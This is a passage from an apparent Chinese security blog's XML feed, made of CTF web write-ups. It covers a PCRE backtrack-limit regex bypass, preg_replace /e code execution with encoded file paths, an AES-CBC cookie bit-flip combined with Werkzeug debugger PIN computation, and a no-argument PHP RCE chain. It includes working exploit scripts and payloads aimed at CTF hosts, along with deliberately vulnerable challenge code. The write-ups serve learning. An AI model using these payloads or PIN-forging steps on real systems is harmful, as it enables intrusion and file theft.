      <tag>ctf</tag>
      
      <tag>web</tag>
      
      <tag>复盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP利用PCRE回溯次数限制绕过</title>
    <link href="/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/"/>
    <url>/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>刷题碰到了这种题目，记录一下知识点。</p><p>首先可以拜读一下p神的文章，还是很有收获的。</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#reply-list">文章</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>然后我也简要的说一下吧。</p><p>常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是</p><ul><li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。</p></li><li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p></li></ul><p>就以p神举的例子，我们正则&lt;?.*[(&#96;;?&gt;].*,然后输入&lt;?php phpinfo();&#x2F;&#x2F;aaaaa这个内容</p><p>由于有.*这个正则，可以匹配任何字符，进行贪婪模式，匹配到.*时，会把php phpinfo();&#x2F;&#x2F;aaaaa所有进行匹配，但是应该不对后面应该还有一个字符[(&#96;;?&gt;]（这是一个字符集匹配其中任意一个，所有我们会进行回溯，吐出a,最终直道吐出；然后可以进行匹配。这个结果满足正则表达式的要求，于是不再回溯。最后的.*匹配的&#x2F;&#x2F;aaaaa，完成正则。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>preg_match本身回身回溯超过1000000会返回false绕过，我们可以构造脚本进行绕过。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>是先看到的题目，然后才开始找知识点的。<a href="https://www.nssctf.cn/problem/1897">NISACTF 2022middlerce</a>。</p><p>先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>include &quot;check.php&quot;;<br>if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;<br>    $txw4ever = $_REQUEST[&#x27;letter&#x27;];<br>    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;<br>        die(&quot;再加把油喔&quot;);<br>    &#125;<br>    else&#123;<br>        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];<br>        checkdata($command);<br>        @eval($command);<br>    &#125;<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>我们只分析这篇的知识点，和上面讲的差不多，cmd绕过后eval进行读取</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload=<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;@&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><span class="hljs-comment">#传的letter,构造payload里面的内容，?&gt;是绕过checkdata,然后js选择cmd里的内容执行代码输出</span><br>res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28304/&quot;</span>, data=&#123;<span class="hljs-string">&quot;letter&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="感受："><a href="#感受：" class="headerlink" title="感受："></a>感受：</h2><p>小白学到知识还是感受良多的，之后如果遇到类似的题目也会继续加在这里。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H&amp;NCTF</title>
    <link href="/2024/05/13/H&amp;NCTF%202024/"/>
    <url>/2024/05/13/H&amp;NCTF%202024/</url>
    
    <content type="html"><![CDATA[<p>前言：比赛也没怎么打，就看了看，自己会的还是太少了，等师傅们发完wp想看看复现一遍的，先写写记录一下知识。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><p>***知识点:***rce绕过-编码绕过</p><p>先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p><em><strong>分析：</strong></em>post传入两个值，task正则绕过，flag大小写绕过</p><p>​然后replace，意思就是执行task传入的内容。</p><p><em><strong>解题：</strong></em>首先构造flag，我们随便改个大小写就行，<code>please_give_me_flaG</code>,然后看task，常用的rce函数都被禁用了，我尝试了scandir读取内容失败了，学习了一会，可以先base64加密再解密得到想要的&#x2F;flag，</p><p>payload:<code>task=var_dump(readfile(base64_decode(&quot;L2ZsYWc=&quot;)))&amp;flag=please_give_me_flaG</code></p><p><img src="/../images/H&NCTF/rce.png" alt="rce"></p><p>也可以用rot-13解密，<code>task=var_dump(readfile(str_rot13(&quot;/synt&quot;)))&amp;flag=please_give_me_flaG</code></p><p>这样也是可以的，可以多尝试看看。（回头看了一下其他师傅的知识点，其实有许多绕过的方法</p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><p><em><strong>知识点：</strong></em>提示看hint，可以给到源码，放一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode<br><br><span class="hljs-keyword">import</span> json<br><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>key = get_random_bytes(AES.block_size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>app = Flask(__name__)<br><br>filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<br>            <span class="hljs-string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session).decode())<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;have a fun&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/hint&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():<br>    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/read&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br><br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<span class="hljs-string">&quot;you are not logged in&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session))<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        plain_session = decrypt(session)<br>        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;don\&#x27;t hack me&#x27;</span><br><br>        session_data = json.loads(plain_session)<br><br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&#x27;admin&#x27;</span>] :<br>            filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):<br>                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&#x27;Access to this file is forbidden.&#x27;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">return</span> f.read()<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&#x27;File not found.&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f&#x27;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not an administrator&#x27;</span><br><br><br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>先审计一下代码</p><p><img src="/../images/H&NCTF/flipPin.png" alt="flipPin"></p><p>是AES-CBC字节反转攻击，</p><p>该方面的信息也是不太懂，搜索了一下内容如下</p><p>Flask在debug模式下会生成一个Debugger PIN，而且如果你多次重启Flask服务，PIN码值不改变。</p><p>通常情况下，对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在**&#x2F;etc&#x2F;machine-id<strong>或</strong>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id**，有的系统没有这两个文件，windows的id获取跟linux也不同。<br>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup：</p><p>也是借用一下师傅的代码吧，我自己也不会写（之后准备系统学一下相关知识</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>url = <span class="hljs-string">&quot;http://hnctf.imxbt.cn:34024/&quot;</span><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><span class="hljs-comment">#源代码给的非管理员用户信息</span><br>res = requests.get(url)<span class="hljs-comment">#发送了一个 GET 请求到目标网站，用于获取一个默认的加密会话。</span><br>c = <span class="hljs-built_in">bytearray</span>(b64decode(res.cookies[<span class="hljs-string">&quot;session&quot;</span>]))<br>c[default_session.index(<span class="hljs-string">&quot;0&quot;</span>)] ^= <span class="hljs-number">1</span><span class="hljs-comment">#session从0改为1</span><br>evil = b64encode(c).decode()<br><br>res = requests.get(url+<span class="hljs-string">f&quot;read?filename=/proc/sys/kernel/random/boot_id&quot;</span>, cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: evil&#125;)<br><span class="hljs-comment">#</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sha1</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctfUser&#x27;</span><span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># 报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;226622582027708&#x27;</span>,<span class="hljs-comment">#  /sys/class/net/eth0/address 16进制转10进制</span><br>    <span class="hljs-comment">#machine_id由两个合并(docker就后两个)：1./proc/sys/kernel/random/boot_id      2./proc/self/cgroup 由于cgroup和mountinfo被禁用,则用/proc/1/cpuset代替读取</span><br>    <span class="hljs-string">&#x27;dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f&#x27;</span>+<span class="hljs-string">&#x27;51b9b7cd533a81e6baec0204f59b346b6558a68bed89cfda595ad4a35cc46a39&#x27;</span><span class="hljs-comment">#  /proc/sys/kernel/random/boot_id + /proc/1/cpuset</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>得到pin，在console里面输入pin</p><p><img src="/../images/H&NCTF/console.png" alt="console"></p><p>大部分都是借鉴的，之后会系统的学一下。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DozerCTF2024</title>
    <link href="/2024/04/28/Dozerctf/Dozerctf2024/"/>
    <url>/2024/04/28/Dozerctf/Dozerctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言：历时一天，最后拿到了团队第八，以下是团队的wp.</p><h1 id="web-and-misc"><a href="#web-and-misc" class="headerlink" title="web and misc"></a>web and misc</h1><h2 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment"># 简简单单签个到吧</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;/[0-9]|get_defined_vars|include|readfile|crypt|require|file_get_contents|readgzfile|highlight_file|show|session|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-variable">$poc</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;die!&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;dieeeeeeee&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>真狠啊，上面把能禁的都禁了，要不然还是挺简单了，想到之前ctfshow里面可以用scandir看看有什么的。尝试构造一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>试了一下好像不能用.&#x2F;来找,说一下localeconv()</p><p>localeconv() 函数是一个编程语言函数，返回包含本地数字及货币信息格式的数组。这里可以通过这个函数读取当前目录下的文件名称。</p><p><img src="/../../images/dozerctf2024/rce.png" alt="rce"></p><p>可以知道flag就应该在fllllaaag.php，尝试直接得，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Parse error: syntax error, unexpected &#x27;&#123;&#x27; in /var/www/html/fllllaaag.php on line 3<br></code></pre></td></tr></table></figure><p>哎被禁了。那想想其他方法吧。</p><p>还是队友思路好啊我就是大菜狗，再讲一个函数array_flip()</p><p>array_flip () 函数用来交换数组中元素的键和值。array_flip() 返回一个反转后的 array，例如 array 中的键名变成了值，而 array 中的值成了键名。</p><p>简单的说就是下标和内容颠倒，就这么理解。</p><p>array_rand()</p><p>在不改变数组的基础上，从数组中随机的选取一个或多个元素，比如我们在网页上随机显示不同的广告，或者推荐不同的文章等等</p><p>又因为include那些被禁了，（劳累.jpg，也是靠队友，用file就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))));<br></code></pre></td></tr></table></figure><p><img src="/../../images/dozerctf2024/rce1.png" 